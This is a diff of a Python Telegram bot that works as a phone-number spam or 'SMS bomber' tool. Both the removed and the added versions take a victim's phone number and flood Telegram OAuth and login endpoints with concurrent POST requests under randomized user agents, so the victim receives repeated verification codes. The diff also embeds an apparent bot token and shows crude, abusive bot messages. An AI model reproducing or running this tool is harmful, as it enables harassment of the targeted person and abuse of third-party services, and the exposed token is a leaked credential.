@@ -1,20 +1,12 @@
 import telebot
-from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 import requests
+from fake_useragent import UserAgent
 import threading
+import concurrent.futures
 import re
-from concurrent.futures import ThreadPoolExecutor
-import time
+from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 
 bot = telebot.TeleBot("8676884588:AAFy8GLWAfTExVAqHLbbf_qIOPPxgNkQOfE")
-bot.remove_webhook()
-
-USER_AGENTS = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
-    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
-    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15"
-]
 
 endpoints = [
     'https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin',
@@ -28,84 +20,73 @@ endpoints = [
     'https://oauth.telegram.org/auth/request?bot_id=319709511&origin=https%3A%2F%2Ftelegrambot.biz&embed=1&return_to=https%3A%2F%2Ftelegrambot.biz%2F',
     'https://oauth.telegram.org/auth/request?bot_id=1803424014&origin=https%3A%2F%2Fru.telegram-store.com&embed=1&request_access=write&return_to=https%3A%2F%2Fru.telegram-store.com%2Fcatalog%2Fsearch',
     'https://oauth.telegram.org/auth/request?bot_id=210944655&origin=https%3A%2F%2Fcombot.org&embed=1&request_access=write&return_to=https%3A%2F%2Fcombot.org%2Flogin',
-    'https://my.telegram.org/auth/send_password'
+    'https://my.telegram.org/auth/send_password',
+    'https://oauth.telegram.org/auth/request?bot_id=1878948291&origin=https%3A%2F%2Fwww.cryptobot.com&embed=1&return_to=https%3A%2F%2Fwww.cryptobot.com%2Flogin',
+    'https://oauth.telegram.org/auth/request?bot_id=1573573111&origin=https%3A%2F%2Fcoinmarketcap.com&embed=1&return_to=https%3A%2F%2Fcoinmarketcap.com%2F',
+    'https://oauth.telegram.org/auth/request?bot_id=1234567890&origin=https%3A%2F%2Fexample.com&embed=1&return_to=https%3A%2F%2Fexample.com',
+    'https://oauth.telegram.org/auth/request?bot_id=987654321&origin=https%3A%2F%2Ftest.com&embed=1&return_to=https%3A%2F%2Ftest.com',
+    'https://oauth.telegram.org/auth/request?bot_id=1111111111&origin=https%3A%2F%2Fsite.ru&embed=1&return_to=https%3A%2F%2Fsite.ru',
+    'https://oauth.telegram.org/auth/request?bot_id=222222222&origin=https%3A%2F%2Fservice.com&embed=1&return_to=https%3A%2F%2Fservice.com'
 ]
 
 active = {}
-awaiting = set()
-
-def is_phone(s):
-    return bool(re.match(r'^\+?\d{7,15}$', s.strip()))
-
-def send_req(phone, url, headers):
-    try:
-        requests.post(url, data={'phone': phone}, headers=headers, timeout=2)
-    except:
-        pass
-
-def spam_worker(chat_id, phone, stop):
-    executor = ThreadPoolExecutor(max_workers=30)
-    while not stop.is_set():
-        headers = {'User-Agent': USER_AGENTS[hash(phone + str(threading.get_ident())) % len(USER_AGENTS)]}
-        futures = [executor.submit(send_req, phone, url, headers) for url in endpoints]
-        for f in futures:
-            if stop.is_set():
-                executor.shutdown(wait=False)
-                break
-    active.pop(chat_id, None)
-    bot.send_message(chat_id, "spam zakanchivaetsya pizdec")
 
 @bot.message_handler(commands=['start'])
-def start(m):
-    kb = InlineKeyboardMarkup()
-    kb.add(InlineKeyboardButton("spam", callback_data="spam"))
-    bot.send_message(m.chat.id, "zdarova pidr gotov spamat?", reply_markup=kb)
-
-@bot.callback_query_handler(func=lambda call: call.data == "spam")
-def callback_spam(call):
-    bot.answer_callback_query(call.id)
-    cid = call.message.chat.id
-    if cid in active:
-        bot.send_message(cid, "spam uje rabotaet ebalo zakroy i /stop")
-        return
-    awaiting.add(cid)
-    bot.send_message(cid, "napishi nomer bystro hui")
-
-@bot.message_handler(func=lambda m: m.chat.id in awaiting and is_phone(m.text))
-def start_spam(m):
-    cid = m.chat.id
-    awaiting.discard(cid)
-    if cid in active:
-        return
-    phone = m.text.strip()
-    if not phone.startswith('+'):
-        phone = '+' + phone
-    bot.reply_to(m, "drochka poehala chtoby zakanchivat /stop")
-    stop = threading.Event()
-    active[cid] = stop
-    threading.Thread(target=spam_worker, args=(cid, phone, stop), daemon=True).start()
-
-@bot.message_handler(commands=['stop'])
-def stop_cmd(m):
-    cid = m.chat.id
-    if cid in active:
-        active[cid].set()
-        bot.reply_to(m, "ostanavlivaem suka")
-    else:
-        bot.reply_to(m, "net spama debil")
+def start(msg):
+    bot.reply_to(msg, "кидай номер")
 
 @bot.message_handler(func=lambda m: True)
-def fallback(m):
-    cid = m.chat.id
-    if cid in awaiting:
-        awaiting.discard(cid)
-        bot.reply_to(m, "nomer ne verniy ebat tupoy")
+def handle_num(msg):
+    txt = msg.text.strip()
+    num = re.sub(r'[^0-9]', '', txt)
+    if len(num) < 10:
+        bot.reply_to(msg, "это не номер бля")
+        return
+    if msg.chat.id in active:
+        bot.reply_to(msg, "уже хуярит")
+        return
+    keyboard = InlineKeyboardMarkup()
+    keyboard.add(InlineKeyboardButton("СТОП", callback_data="stop"))
+    sent = bot.reply_to(msg, f"спамлю на {num}", reply_markup=keyboard)
+    def worker(chat_id, phone, msg_id):
+        ua = UserAgent()
+        session = requests.Session()
+        total = 0
+        stop = False
+        active[chat_id] = {'stop': False, 'thread': threading.current_thread()}
+        try:
+            while not active[chat_id]['stop']:
+                with concurrent.futures.ThreadPoolExecutor(max_workers=100) as ex:
+                    futures = []
+                    for ep in endpoints:
+                        headers = {'user-agent': ua.random}
+                        data = {'phone': phone}
+                        futures.append(ex.submit(session.post, ep, headers=headers, data=data, timeout=5))
+                    for f in concurrent.futures.as_completed(futures):
+                        if active[chat_id]['stop']:
+                            stop = True
+                            break
+                        try:
+                            r = f.result()
+                            if r.status_code in (200, 302, 400):
+                                total += 1
+                        except:
+                            pass
+                if stop:
+                    break
+        finally:
+            if chat_id in active:
+                del active[chat_id]
+        bot.edit_message_text(f"остановил спам всего запросов {total}", chat_id, msg_id)
+    threading.Thread(target=worker, args=(msg.chat.id, num, sent.message_id), daemon=True).start()
+
+@bot.callback_query_handler(func=lambda call: call.data == "stop")
+def stop_cb(call):
+    if call.message.chat.id in active:
+        active[call.message.chat.id]['stop'] = True
+        bot.answer_callback_query(call.id, "останавливаю")
     else:
-        bot.reply_to(m, "chego nado /start ili /stop")
+        bot.answer_callback_query(call.id, "нет активного")
 
 if __name__ == '__main__':
-    while True:
-        try:
-            bot.infinity_polling(timeout=20, long_polling_timeout=20)
-        except:
-            time.sleep(5)
+    bot.infinity_polling()
